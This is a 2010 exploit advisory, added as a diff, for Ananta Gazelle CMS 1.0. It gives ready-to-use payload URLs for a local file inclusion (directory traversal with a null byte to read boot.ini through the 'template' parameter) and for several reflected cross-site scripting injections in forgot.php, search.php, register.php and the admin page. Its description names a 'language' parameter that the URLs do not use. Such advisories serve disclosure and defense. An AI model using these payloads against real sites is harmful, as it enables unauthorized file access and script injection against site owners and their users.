@@ -1,0 +1,54 @@
+############################################################################
+#                                                                          #
+# Exploit Title: Ananta_Gazelle Local File inclusion / Xss Vulnerabilities #
+#                                                                          #
+# Date: 23/08/2010                                                         #
+#                                                                          #
+# Author: Sweet                                                            #
+#                                                                          #
+# Contact : charif38@hotmail.fr                                            #
+#                                                                          #
+# Software Link: www.anantasoft.com                                        #
+#                                                                          # 
+# Download:http://www.anantasoft.com/index.php?Gazelle%20CMS/Download      #
+#                                                                          # 
+# Version: Ananta_Gazelle1.0                                               #
+#                                                                          #
+# Tested on: WinXp sp3                                                     #
+#                                                                          #
+#                                                                          #
+#                                                                          #
+#                                                                          #
+# Description : Gazelle is fast, free and requires no learning             # 
+#                                                                          #
+# you can just dive in with the content and make a big site                #
+#                                                                          #
+############################################################################
+
+
+
+1-Local File Inclusion :
+
+Input passed to to the "language" parameter in index.php isn't properly verified, before it is used to include files 
+This can be exploited to include arbitrary files from local resources
+
+
+http://www.example.com/AnantaPatch/index.php?template=../../../../../../../../../../boot.ini%00
+
+http://www.example.com/AnantaPatch/admin/index.php?template=../../../../../../../../../../boot.ini%00
+
+
+Screen <=> http://img541.imageshack.us/img541/3482/ananta.png
+
+
+2-Xss :
+
+http://www.example.com/AnantaPatch/forgot.php/>"><ScRiPt>alert("Sweet")</ScRiPt>
+
+http://www.example.com/AnantaPatch/search.php?lookup=1>'><ScRiPt%20%0a%0d>alert("Sweet")%3B</ScRiPt>
+
+http://www.example.com/AnantaPatch/register.php?=>"'><ScRiPt>alert("Sweet")</ScRiPt>
+
+http://www.example.com/AnantaPatch/admin/?=>"'><ScRiPt>alert("Sweet")</ScRiPt>
+
+Saha Ftourkoum et 1,2,3 viva L'Algerie :))
